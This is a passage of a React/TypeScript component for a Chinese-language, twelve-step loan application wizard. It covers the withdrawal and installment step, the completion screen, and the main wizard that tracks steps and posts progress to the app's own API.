     const monthlyPayment = withdrawalAmount ? calculateMonthlyPayment(parseFloat(withdrawalAmount.toString()), installmentPeriod) : 0;

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step11.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step11.subtitle')}</p>
      </div>
      
      <div className="space-y-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step11.withdrawalAmountLabel')}
          </label>
                     <input
             type="number"
             value={withdrawalAmount}
             onChange={(e) => setWithdrawalAmount(e.target.value)}
             placeholder={t('loanWizard.step11.withdrawalAmountPlaceholder')}
             max={maxAmount.toString()}
             min="1000"
             step="100"
             className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-lg"
           />
          <div className="mt-2 text-sm text-gray-500">
            可提现范围：¥1,000 - ¥{maxAmount.toLocaleString()}
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step11.installmentPeriodLabel')}
          </label>
          <div className="grid grid-cols-3 gap-3">
            {[3, 6, 12].map((period) => (
              <button
                key={period}
                onClick={() => setInstallmentPeriod(period)}
                className={`p-3 border rounded-lg text-center transition-colors ${
                  installmentPeriod === period
                    ? 'border-blue-500 bg-blue-50 text-blue-600'
                    : 'border-gray-300 hover:border-gray-400'
                }`}
              >
                <div className="font-medium">{period}{t('loanWizard.step11.installmentPeriodSuffix')}</div>
                <div className="text-sm text-gray-500">{period}{t('loanWizard.step11.installmentMonths')}</div>
              </button>
            ))}
          </div>
        </div>

        {withdrawalAmount && (
          <div className="bg-gray-50 rounded-lg p-4">
            <h4 className="font-semibold mb-3">{t('loanWizard.step11.repaymentPlanTitle')}</h4>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.loanAmountLabel')}:</span>
                <span>¥{parseFloat(withdrawalAmount.toString()).toLocaleString()}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.installmentPeriodLabel')}:</span>
                <span>{installmentPeriod}{t('loanWizard.step11.installmentPeriodSuffix')}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.interestRateLabel')}:</span>
                <span>15.6%</span>
              </div>
              <hr className="my-2" />
              <div className="flex justify-between font-medium">
                <span>{t('loanWizard.step11.monthlyPaymentLabel')}:</span>
                <span className="text-blue-600">¥{monthlyPayment.toFixed(2)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">{t('loanWizard.step11.totalRepaymentLabel')}:</span>
                <span>¥{(monthlyPayment * installmentPeriod).toFixed(2)}</span>
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第12步：提现完成
const Step12Complete: React.FC<StepProps> = ({ data }) => {
  const { t } = useTranslation();
  return (
    <div className="space-y-6 text-center">
      <div>
        <div className="w-20 h-20 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
          <span className="text-4xl">✅</span>
        </div>
        <h3 className="text-2xl font-bold text-green-600 mb-2">{t('loanWizard.step12.successTitle')}</h3>
        <p className="text-gray-600">{t('loanWizard.step12.successDesc')}</p>
      </div>
      
      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
        <h4 className="font-semibold text-green-800 mb-4">{t('loanWizard.step12.withdrawalDetailsTitle')}</h4>
        <div className="space-y-3 text-sm">
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.withdrawalAmountLabel')}:</span>
            <span className="font-medium">¥{data.withdrawalAmount?.toLocaleString()}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.arrivalBankCardLabel')}:</span>
            <span>****{data.bankCardNumber?.slice(-4)}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.installmentPeriodLabel')}:</span>
            <span>{data.installmentPeriod}{t('loanWizard.step11.installmentPeriodSuffix')}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step12.arrivalTimeLabel')}:</span>
            <span>2小时内</span>
          </div>
        </div>
      </div>

      <div className="space-y-4">
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step12.tipsTitle')}</h4>
          <ul className="text-sm text-blue-700 space-y-1 text-left">
            <li>{t('loanWizard.step12.tips1')}</li>
            <li>{t('loanWizard.step12.tips2')}</li>
            <li>{t('loanWizard.step12.tips3')}</li>
            <li>{t('loanWizard.step12.tips4')}</li>
          </ul>
        </div>
        
        <div className="flex gap-3">
          <button
            onClick={() => window.location.href = '/user-center'}
            className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
          >
            {t('loanWizard.step12.viewRepaymentPlanButton')}
          </button>
          <button
            onClick={() => window.location.href = '/'}
            className="flex-1 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
          >
            {t('loanWizard.step12.returnHomeButton')}
          </button>
        </div>
      </div>
    </div>
  );
};

// 主向导组件
const LoanWizard: React.FC = () => {
  const { t } = useTranslation();
  const [currentStep, setCurrentStep] = useState(1);
  const [applicationData, setApplicationData] = useState<LoanApplication>({ step: 1 });
  const totalSteps = 12;

  // 初始化访客申请
  useEffect(() => {
    if (!applicationData.id) {
      createGuestApplication();
    }
  }, []);

  const createGuestApplication = async () => {
    try {
      const sessionId = sessionStorage.getItem('guestSessionId') || crypto.randomUUID();
      sessionStorage.setItem('guestSessionId', sessionId);
      
      const response = await fetch('/api/applications/guest', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Session-ID': sessionId
        }
      });
      
      if (response.ok) {
        const result = await response.json();
        setApplicationData(prev => ({ 
          ...prev, 
          id: result.applicationId, 
          sessionId: result.sessionId,
          isGuest: true 
        }));
      }
    } catch (error) {
      console.error('Failed to create guest application:', error);
    }
  };

  const updateApplicationStep = async (step: number, stepData: any) => {
    if (!applicationData.id) return;
    
    try {
      await fetch(`/api/applications/${applicationData.id}/step`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          step, 
          data: stepData,
          phone: applicationData.phone 
        })
      });
    } catch (error) {
      console.error('Failed to update application step:', error);
    }
  };

  const updateData = (newData: Partial<LoanApplication>) => {
    setApplicationData(prev => ({ ...prev, ...newData }));
  };

  const nextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
      // 更新申请步骤
      updateApplicationStep(currentStep + 1, applicationData);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const renderStep = () => {
    const stepProps = {
      data: applicationData,
      onUpdate: updateData,
      onNext: nextStep,
      onBack: prevStep,
      updateApplicationStep
    };

    switch (currentStep) {
      case 1:
        return <Step1UserRegistration {...stepProps} />;
      case 2:
        return <Step2Identity {...stepProps} />;
      case 3:
        return <Step3IdUpload {...stepProps} />;
      case 4:
        return <Step4Contacts {...stepProps} />;
      case 5:
        return <Step5LivenessDetection {...stepProps} />;
      case 6:
        return <Step6CreditAuthorization {...stepProps} />;
      case 7:
        return <Step7BankCard {...stepProps} />;
      case 8:
        return <Step8SubmitApplication {...stepProps} />;
      case 9:
        return <Step9Processing {...stepProps} />;
      case 10:
        return <Step10Approved {...stepProps} />;
      case 11:
        return <Step11Withdrawal {...stepProps} />;
      case 12:
        return <Step12Complete {...stepProps} />;
      default:
        return <div>未知步骤</div>;
    }
  };

  return (
    <div className="max-w-2xl mx-auto">
      {/* 进度条 */}
      <div className="mb-8">
        <div className="flex items-center justify-between mb-2">
          <span className="text-sm font-medium text-blue-600">{t('loanWizard.stepProgress', { current: currentStep, total: totalSteps })}</span>
          <span className="text-sm text-gray-500">{Math.round((currentStep / totalSteps) * 100)}% {t('loanWizard.stepCompletion')}</span>
        </div>
        <div className="w-full bg-gray-200 rounded-full h-2">
          <div 
            className="bg-blue-600 h-2 rounded-full transition-all duration-300"
            style={{ width: `${(currentStep / totalSteps) * 100}%` }}
          ></div>
        </div>
      </div>

      {/* 当前步骤内容 */}
      <div className="bg-white rounded-xl shadow-lg p-8">
        {renderStep()}
      </div>
    </div>
  );
};

export default LoanWizard; 